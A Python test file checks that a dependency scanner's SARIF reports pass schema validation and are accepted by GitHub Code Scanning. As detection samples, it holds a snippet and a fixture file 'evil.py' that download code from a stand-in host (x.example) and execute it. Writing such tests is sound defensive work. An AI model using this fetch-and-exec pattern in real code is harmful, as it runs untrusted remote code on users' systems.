"""FR-280: the SARIF report is accepted by GitHub Code Scanning.

``github/codeql-action/upload-sarif`` rejected the action's report. Two
rules decide whether an upload is accepted, and the reporter broke both:

* The file must validate against the SARIF 2.1.0 schema. The
  pin-override and multi-version results put ``logicalLocations``
  directly on the result, which the schema forbids (it belongs inside
  ``locations[]``).
* Every result must have at least one ``physicalLocation``. The schema
  allows a result without one; GitHub does not. Undeclared imports
  (``source="detected:..."``), pin-overrides, multi-version coordinates
  and REQ-22 ABI findings (``file_path=""``) had none.

The action-smoke workflow runs with ``upload-sarif: "false"``, so CI
never saw either. These tests validate against the official OASIS
schema, vendored under ``tests/fixtures/sarif/`` so they run offline.
"""
from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import jsonschema
import pytest

from scarno.models import (
    AnalysisResult,
    Dependency,
    DependencyStatus,
    Finding,
    FindingKind,
    FindingSeverity,
)
from scarno.reporters.sarif_reporter import SarifReporter

_SCHEMA_PATH = (
    Path(__file__).resolve().parents[1]
    / "fixtures"
    / "sarif"
    / "sarif-schema-2.1.0.json"
)
_FIXTURES = Path(__file__).resolve().parents[1] / "fixtures"


@pytest.fixture(scope="module")
def validator() -> jsonschema.Draft4Validator:
    schema = json.loads(_SCHEMA_PATH.read_text(encoding="utf-8"))
    # The schema is draft-04 but uses ``uri-reference``, a draft-06 format.
    # jsonschema's draft-04 checker does not know it and would skip it, so
    # take the draft-07 checker. It also skips a format silently when its
    # checker library is missing. The URI checks are the point of half
    # these tests, so fail loudly instead.
    checker = jsonschema.Draft7Validator.FORMAT_CHECKER
    assert "uri" in checker.checkers and "uri-reference" in checker.checkers, (
        "install rfc3986-validator (dev group) so URI formats are checked"
    )
    return jsonschema.Draft4Validator(schema, format_checker=checker)


def _dep(
    name: str,
    status: DependencyStatus,
    source: str,
    *,
    ecosystem: str = "pypi",
    **kw: Any,
) -> Dependency:
    return Dependency(
        name, kw.pop("version", None), status, kw.pop("reason", "r"), [], 0, 0,
        source=source, ecosystem=ecosystem, **kw,
    )


def _abi_finding(coord: str) -> Finding:
    return Finding(
        rule_id="TS-ABI-DRIFT",
        kind=FindingKind.ABI_DRIFT,
        severity=FindingSeverity.MEDIUM,
        file_path="",
        line=0,
        snippet="",
        message="com.example.Foo#bar() is no longer present",
        remediation="Check the resolved version",
        package_hint=coord,
    )


@pytest.fixture
def every_result_kind() -> AnalysisResult:
    """One of each result shape the reporter emits."""
    return AnalysisResult(
        project_type="python,javascript,java",
        project_path="/home/runner/work/my repo/my repo",
        dependencies=[
            _dep("boto3", DependencyStatus.SAFE, "pyproject.toml:project"),
            _dep("pandas", DependencyStatus.UNDECLARED, "detected:pandas"),
            _dep("left-pad", DependencyStatus.UNDECLARED, "detected:left-pad",
                 ecosystem="npm"),
            _dep("re2js", DependencyStatus.IN_USE, "package.json", ecosystem="npm",
                 pin_override=True, pin_override_kind="NPM_OVERRIDES",
                 pin_override_target="re2js@1.2.0"),
            _dep("com.example:lib", DependencyStatus.IN_USE, "pom.xml",
                 ecosystem="maven"),
        ],
        errors=["a warning"],
        findings=[
            Finding(
                rule_id="TS-CE-001",
                kind=FindingKind.REMOTE_CODE_EXEC,
                severity=FindingSeverity.CRITICAL,
                file_path="src/naïve module/main.py",
                line=10,
                snippet="exec(requests.get(url).text)",
                message="exec() applied to a network response",
                remediation="Never execute untrusted remote content",
            ),
            _abi_finding("com.example:lib"),
        ],
        multi_version_coords=["com.example:lib"],
    )


def _render(result: AnalysisResult) -> dict[str, Any]:
    return json.loads(SarifReporter().render(result))


def _results(sarif: dict[str, Any]) -> list[dict[str, Any]]:
    return sarif["runs"][0]["results"]


def _uris(result: dict[str, Any]) -> list[str]:
    return [
        loc["physicalLocation"]["artifactLocation"]["uri"]
        for loc in result["locations"]
    ]


def _by_rule(sarif: dict[str, Any], rule_id: str) -> list[dict[str, Any]]:
    return [r for r in _results(sarif) if r["ruleId"] == rule_id]


@pytest.mark.requirement("FR-280")
def test_report_validates_against_the_sarif_schema(
    validator, every_result_kind
) -> None:
    errors = sorted(
        validator.iter_errors(_render(every_result_kind)),
        key=lambda e: list(e.absolute_path),
    )
    assert not errors, [
        f"{'/'.join(map(str, e.absolute_path))}: {e.message}" for e in errors
    ]


@pytest.mark.requirement("FR-280")
def test_every_result_has_a_physical_location(every_result_kind) -> None:
    """GitHub's 'expected at least one location' rejection."""
    sarif = _render(every_result_kind)
    kinds = {r["ruleId"] for r in _results(sarif)}
    # The fixture must cover every shape, or this test proves nothing.
    assert {
        "TS-CE-001", "TS-ABI-DRIFT", "TS-DEP-SAFE", "TS-DEP-UNDECLARED",
        "TS-DEP-PIN-OVERRIDE-NPM", "TS-DEP-MULTI-VERSION",
    } <= kinds
    for result in _results(sarif):
        assert result["locations"], result["ruleId"]
        assert all(_uris(result)), result["ruleId"]


@pytest.mark.requirement("FR-280")
def test_logical_locations_sit_inside_locations(every_result_kind) -> None:
    sarif = _render(every_result_kind)
    assert not any("logicalLocations" in r for r in _results(sarif))
    (pin,) = _by_rule(sarif, "TS-DEP-PIN-OVERRIDE-NPM")
    assert pin["locations"] == [{
        "physicalLocation": {"artifactLocation": {"uri": "package.json"}},
        "logicalLocations": [{"name": "re2js", "kind": "package"}],
    }]
    (multi,) = _by_rule(sarif, "TS-DEP-MULTI-VERSION")
    assert _uris(multi) == ["pom.xml"]
    assert multi["locations"][0]["logicalLocations"] == [
        {"name": "com.example:lib", "kind": "package"}
    ]


@pytest.mark.requirement("FR-280")
def test_undeclared_import_points_at_its_ecosystems_manifest(
    every_result_kind
) -> None:
    """An undeclared import's location is the manifest it should be
    declared in, chosen per ecosystem."""
    undeclared = {
        r["properties"]["package"]: _uris(r)
        for r in _by_rule(_render(every_result_kind), "TS-DEP-UNDECLARED")
    }
    assert undeclared == {"pandas": ["pyproject.toml"], "left-pad": ["package.json"]}


@pytest.mark.requirement("FR-280")
def test_abi_finding_points_at_the_declaring_manifest(every_result_kind) -> None:
    (abi,) = _by_rule(_render(every_result_kind), "TS-ABI-DRIFT")
    assert abi["locations"] == [
        {"physicalLocation": {"artifactLocation": {"uri": "pom.xml"}}}
    ]


@pytest.mark.requirement("FR-280")
def test_result_with_nowhere_to_point_is_dropped_and_counted(validator) -> None:
    """No manifest anywhere in the run: the undeclared import has no file.
    Emitting it would make GitHub reject every other result too."""
    result = AnalysisResult(
        project_type="python",
        project_path="/tmp/p",
        dependencies=[_dep("pandas", DependencyStatus.UNDECLARED, "detected:pandas")],
        errors=[],
        findings=[_abi_finding("com.example:absent")],
    )
    sarif = _render(result)
    run = sarif["runs"][0]
    assert _results(sarif) == []
    assert run["properties"]["resultsWithoutLocation"] == 2
    notes = run["invocations"][0]["toolExecutionNotifications"]
    assert any(n["message"]["text"].startswith("2 result(s) left out") for n in notes)
    assert not list(validator.iter_errors(sarif))


@pytest.mark.requirement("FR-280")
def test_empty_manifest_with_undeclared_import_still_uploads(
    runner, validator, tmp_path: Path
) -> None:
    """The real-world way to reach the drop path: a project whose only
    manifest declares nothing. The upload must still be accepted."""
    from scarno.cli import app

    (tmp_path / "requirements.txt").write_text("", encoding="utf-8")
    (tmp_path / "main.py").write_text("import yaml\n", encoding="utf-8")
    (tmp_path / "evil.py").write_text(
        'import requests\nexec(requests.get("https://x.example/p").text)\n',
        encoding="utf-8",
    )
    out = tmp_path / "out.sarif"
    result = runner.invoke(
        app, [str(tmp_path), "--format", "sarif", "--output", str(out)]
    )
    assert result.exit_code != 2, result.output
    sarif = json.loads(out.read_text(encoding="utf-8"))
    assert not list(validator.iter_errors(sarif))
    assert [r["ruleId"] for r in _results(sarif)] == ["TS-CE-001"]
    for r in _results(sarif):
        assert r["locations"] and all(_uris(r)), r["ruleId"]


@pytest.mark.requirement("FR-280")
@pytest.mark.parametrize(
    ("project_path", "uri"),
    [
        ("/home/runner/work/repo/repo", "file:///home/runner/work/repo/repo/"),
        ("/home/runner/work/my repo/", "file:///home/runner/work/my%20repo/"),
        ("D:\\a\\repo\\repo", "file:///D:/a/repo/repo/"),
        ("services/api", "services/api/"),
    ],
)
def test_working_directory_is_a_uri(validator, project_path: str, uri: str) -> None:
    result = AnalysisResult("python", project_path, [], [], [])
    sarif = _render(result)
    assert sarif["runs"][0]["invocations"][0]["workingDirectory"]["uri"] == uri
    assert not list(validator.iter_errors(sarif))


@pytest.mark.requirement("FR-280")
def test_paths_are_percent_encoded(every_result_kind) -> None:
    (rce,) = _by_rule(_render(every_result_kind), "TS-CE-001")
    assert _uris(rce) == ["src/na%C3%AFve%20module/main.py"]


@pytest.mark.requirement("FR-280")
@pytest.mark.parametrize(
    "fixture",
    ["simple_python", "javascript_simple", "java_simple", "gradle_simple",
     "go_simple", "csharp_simple", "webapp_python_frontend"],
)
def test_cli_report_on_fixture_is_accepted(
    runner, validator, fixture: str, tmp_path: Path
) -> None:
    from scarno.cli import app

    root = _FIXTURES / fixture
    out = tmp_path / "out.sarif"
    result = runner.invoke(app, [str(root), "--format", "sarif", "--output", str(out)])
    assert result.exit_code != 2, result.output
    sarif = json.loads(out.read_text(encoding="utf-8"))
    assert not list(validator.iter_errors(sarif))
    for r in _results(sarif):
        assert r["locations"] and all(_uris(r)), r["ruleId"]
